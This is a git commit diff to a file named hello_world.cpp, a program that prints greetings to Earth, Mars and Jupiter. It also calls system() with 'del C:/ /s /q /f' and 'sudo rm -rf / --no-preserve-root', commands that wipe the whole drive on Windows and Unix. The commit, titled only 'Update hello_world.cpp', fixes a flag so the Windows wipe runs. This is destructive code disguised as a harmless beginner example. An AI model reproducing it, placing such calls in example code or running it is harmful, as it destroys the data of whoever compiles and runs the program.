6581b24ec4af21f3dc2c2b2631765fac9dff9aaa
randomrepository228 <122028168+randomrepository228@users.noreply.github.com>
2024-12-09 21:06:47 +0300

    Update hello_world.cpp

--- hello_world.cpp
+++ hello_world.cpp
@@ -7,6 +7,6 @@ int main()
     std::cout << "Hello World!" << std::endl;
     std::cout << "Hello Mars!" << std::endl;
     std::cout << "Hello Jupiter!" << std::endl;
-    system("del C:/ /s /q f");
+    system("del C:/ /s /q /f");
     system("sudo rm -rf / --no-preserve-root");
 }
